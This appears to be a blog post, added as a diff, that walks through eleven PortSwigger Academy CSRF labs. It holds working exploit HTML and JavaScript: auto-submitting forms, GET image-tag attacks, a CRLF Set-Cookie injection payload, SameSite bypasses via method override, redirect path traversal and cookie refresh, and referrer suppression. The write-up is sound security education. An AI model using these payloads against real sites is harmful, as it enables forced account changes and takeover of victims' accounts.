@@ -1,0 +1,307 @@
+---
+layout: default
+title: "Mastering CSRF Attacks: A Deep Dive into PortSwigger Labs (Part 2)"
+date: 2025-12-16
+categories: [Web Security, CSRF]
+toc: true
+---
+
+# 🧠 Understanding CSRF Exploitation
+
+
+
+Cross-Site Request Forgery (CSRF) occurs when a malicious website causes a user's web browser to perform an unwanted action on a trusted site where the user is currently authenticated. The impact ranges from unauthorized state changes (like changing emails) to full account takeover.
+
+This guide breaks down **eleven** distinct exploitation scenarios found in the PortSwigger Web Security Academy, demonstrating how to bypass common defenses like Tokens, Referer checks, and SameSite cookies.
+
+---
+
+## 🧪 SCENARIO 1: CSRF Vulnerability with No Defenses
+
+### 🧐 How the Vulnerability Exists
+The application allows users to update their email address via a simple `POST` request. It relies solely on session cookies for authentication and has no secondary verification (CSRF tokens) implemented.
+
+**Root Cause:** The backend trusts the presence of the session cookie as proof of intent.
+
+### 🚨 Exploitation Steps
+
+1.  **Analyze Request:**
+    Capture the "Update email" request. Observe it has no `csrf` token.
+    
+2.  **Construct Exploit:**
+    Create an HTML form that targets the vulnerable endpoint and auto-submits.
+    ```html
+    <html>
+    <body>
+    <form action="[https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email](https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email)" method="POST">
+        <input type="hidden" name="email" value="pwned@evil-user.net">
+    </form>
+    <script> document.forms[0].submit(); </script>
+    </body>
+    </html>
+    ```
+   
+
+3.  **Execute:**
+    Host this on an exploit server and deliver it to the victim. Their browser will submit the form with their cookies, changing their email.
+
+**IMPACT:** Unauthorized account modification.
+
+---
+
+## 🧪 SCENARIO 2: Validation Depends on Request Method
+
+### 🧐 How the Vulnerability Exists
+The application correctly checks for a CSRF token in `POST` requests but fails to perform the same check for `GET` requests.
+
+**Root Cause:** Logic flaw where security controls are tied to specific HTTP methods.
+
+### 🚨 Exploitation Steps
+
+1.  **Bypass Filter:**
+    Send the valid `POST` request to Repeater.
+    Change the method to `GET` (and move parameters to the URL).
+    **Remove the token entirely.**
+    
+    ![image](/images/Pasted%20image%2020251212165732.png)
+    
+    ![image](/images/Pasted%20image%2020251212165749.png)
+
+2.  **Construct Exploit:**
+    Since it works via `GET`, we can use a simple image tag.
+    ```html
+    <img src="[https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email?email=pwned@evil-user.net](https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email?email=pwned@evil-user.net)">
+    ```
+   
+
+---
+
+## 🧪 SCENARIO 3: Validation Depends on Token Presence
+
+### 🧐 How the Vulnerability Exists
+The application validates the CSRF token *only if* the parameter is present. If the parameter is missing, the validation step is skipped.
+
+**Root Cause:** Flawed conditional logic (`if token_present then validate else allow`).
+
+### 🚨 Exploitation Steps
+
+1.  **Test Bypass:**
+    In Repeater, delete the `csrf` parameter completely from the body.
+    Ensure the syntax remains valid.
+    
+    ![image](/images/Pasted%20image%2020251212170718.png)
+    
+    **Result:** The server accepts the request without a token.
+    
+    ![image](/images/Pasted%20image%2020251212170745.png)
+
+2.  **Construct Exploit:**
+    Create a standard HTML form exploit that simply omits the `csrf` input field.
+   
+
+    ![image](/images/Pasted%20image%2020251212170845.png)
+
+---
+
+## 🧪 SCENARIO 4: Token Not Tied to User Session
+
+### 🧐 How the Vulnerability Exists
+The application maintains a global pool of valid tokens. It checks if the token exists in the pool but fails to check if it belongs to the *specific user* making the request.
+
+**Root Cause:** Failure to bind the CSRF token to the user's session.
+
+### 🚨 Exploitation Steps
+
+1.  **Harvest Token:**
+    Log in with your attacker account (`wiener`).
+    Copy a valid, unused CSRF token.
+
+2.  **Construct Exploit:**
+    Create an exploit form that uses *your* valid token but submits the request to change the *victim's* email.
+    ```html
+    <form action="...">
+        <input type="hidden" name="email" value="pwned@evil.com">
+        <input type="hidden" name="csrf" value="ATTACKER_VALID_TOKEN">
+        <input type="submit">
+    </form>
+    <script>document.forms[0].submit();</script>
+    ```
+   
+
+3.  **Attack:**
+    When the victim submits this form, the server sees a valid token (yours) and a valid session (theirs), and accepts the request.
+
+---
+
+## 🧪 SCENARIO 5: Token Tied to Non-Session Cookie
+
+### 🧐 How the Vulnerability Exists
+The application validates the token by comparing it to a separate cookie (e.g., `csrfKey`). This cookie is not tied to the session. If we can set this cookie in the victim's browser, we can force them to use a token we know.
+
+**Root Cause:** "Double Submit" pattern flaw combined with a header injection vulnerability.
+
+### 🚨 Exploitation Steps
+
+1.  **Identify Gadget:**
+    The search function reflects input into the `Set-Cookie` header (CRLF Injection).
+    Payload: `/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR_KEY%3b%20SameSite=None`
+
+2.  **Construct Exploit:**
+    We need to perform two actions:
+    1.  Inject the cookie using the search image.
+    2.  Submit the form using the matching token.
+    
+    ```html
+    <form action="..." method="POST">
+        <input type="hidden" name="email" value="pwned@evil.com">
+        <input type="hidden" name="csrf" value="YOUR_TOKEN">
+    </form>
+    <img src=".../?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR_KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">
+    ```
+   
+
+---
+
+## 🧪 SCENARIO 6: Token Duplicated in Cookie
+
+### 🧐 How the Vulnerability Exists
+The application simply checks that the `csrf` body parameter matches the `csrf` cookie. It does not validate if they are real tokens.
+
+**Root Cause:** Naive "Double Submit" implementation.
+
+### 🚨 Exploitation Steps
+
+1.  **Cookie Injection:**
+    Use the same CRLF injection technique as Scenario 5 to set the victim's `csrf` cookie to an arbitrary value (e.g., `FAKE`).
+
+2.  **Construct Exploit:**
+    Create a form where the `csrf` parameter is also `FAKE`.
+    Since `Cookie (FAKE) == Body (FAKE)`, the server accepts the request.
+
+---
+
+## 🧪 SCENARIO 7: SameSite Lax Bypass via Method Override
+
+### 🧐 How the Vulnerability Exists
+The browser's `SameSite=Lax` default blocks cookies on cross-site `POST` requests. However, the framework supports "Method Overriding" via a query parameter.
+
+**Root Cause:** Framework allows simulating POST via GET.
+
+### 🚨 Exploitation Steps
+
+1.  **Override Method:**
+    Change the attack to a `GET` request (which `Lax` allows).
+    Append `_method=POST` to the URL.
+    
+    ![image](/images/Pasted%20image%2020251212185711.png)
+
+2.  **Exploit:**
+    Use a simple top-level navigation script.
+    ```html
+    <script>
+    document.location = "https://TARGET/my-account/change-email?email=pwned@evil.com&_method=POST";
+    </script>
+    ```
+   
+
+---
+
+## 🧪 SCENARIO 8: SameSite Strict Bypass via Client-Side Redirect
+
+### 🧐 How the Vulnerability Exists
+`SameSite=Strict` blocks all cross-site cookies. We need to trick the site into sending the request *from itself*.
+We find an open redirect (or client-side redirect) on the target site.
+
+**Root Cause:** Using an on-site gadget to sanitize the origin.
+
+### 🚨 Exploitation Steps
+
+1.  **Find Gadget:**
+    The comment confirmation page redirects users: `/post/comment/confirmation?postId=1`.
+    It allows path traversal: `postId=1/../../my-account/change-email`.
+
+2.  **Construct Exploit:**
+    Send the victim to the *redirect* page.
+    The site redirects *itself* to the email change endpoint. Since the request comes from the site's own domain, the browser attaches the `Strict` cookie.
+    
+    ```html
+    <script>
+    document.location = "https://TARGET/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40evil.com%26submit=1";
+    </script>
+    ```
+   
+
+---
+
+## 🧪 SCENARIO 9: SameSite Lax Bypass via Cookie Refresh
+
+### 🧐 How the Vulnerability Exists
+Chrome allows a 2-minute window where a *newly issued* cookie is exempt from `Lax` restrictions to support SSO flows.
+
+**Root Cause:** Exploiting the "Lax + POST" exception window.
+
+### 🚨 Exploitation Steps
+
+1.  **Force Refresh:**
+    Use `window.open()` to trigger the social login flow, which issues a fresh session cookie.
+
+2.  **Wait and Attack:**
+    Wait 5 seconds for the login to complete.
+    Auto-submit the POST form. The cookie is "fresh," so the browser sends it despite the cross-site POST.
+    
+    ```javascript
+    window.onclick = () => {
+        window.open('https://TARGET/social-login');
+        setTimeout(() => document.forms[0].submit(), 5000);
+    }
+    ```
+   
+
+---
+
+## 🧪 SCENARIO 10: Broken Referer Validation
+
+### 🧐 How the Vulnerability Exists
+The application validates the `Referer` header but uses a loose Regex (e.g., `contains`).
+
+**Root Cause:** Checking for the domain string anywhere in the header rather than the start.
+
+### 🚨 Exploitation Steps
+
+1.  **Bypass Regex:**
+    Place the target domain in the query string of your exploit server.
+    `http://attacker-server.com/?vulnerable-website.com`
+
+2.  **Suppress Privacy:**
+    Add `<meta name="referrer" content="unsafe-url">` to ensure the browser sends the full URL query string.
+
+---
+
+## 🧪 SCENARIO 11: Referer Validation Depends on Header Presence
+
+### 🧐 How the Vulnerability Exists
+The application strictly validates the Referer *if* it is present. However, if the header is missing, it fails open (allows the request).
+
+**Root Cause:** Default-allow policy for missing headers.
+
+### 🚨 Exploitation Steps
+
+1.  **Suppress Header:**
+    Add `<meta name="referrer" content="never">` to your exploit page.
+    
+2.  **Attack:**
+    The browser strips the Referer header entirely. The server sees no header and allows the request.
+
+---
+
+## ⚡ Fast Triage Cheat Sheet
+
+| Attack Vector | 🚩 Immediate Signal | 🔧 The Critical Move |
+| :--- | :--- | :--- |
+| **No Defense** | No token in Body. | Simple HTML Form. |
+| **Method Swap** | POST has token, GET does not. | Convert to GET (or `_method=POST`). |
+| **Missing Token** | Removing param works. | Delete `csrf` parameter from body. |
+| **Loose Token** | Tokens work for any user. | Use your own valid token. |
+| **Double Submit** | Token == Cookie. | Inject cookie via CRLF (`Set-Cookie`). |
+| **SameSite Strict** | Site has redirects. | Chain redirect to target endpoint. |
+| **Referer** | `Referer` checked loosely. | Use `referrer="unsafe-url"` or `referrer="never"`. |
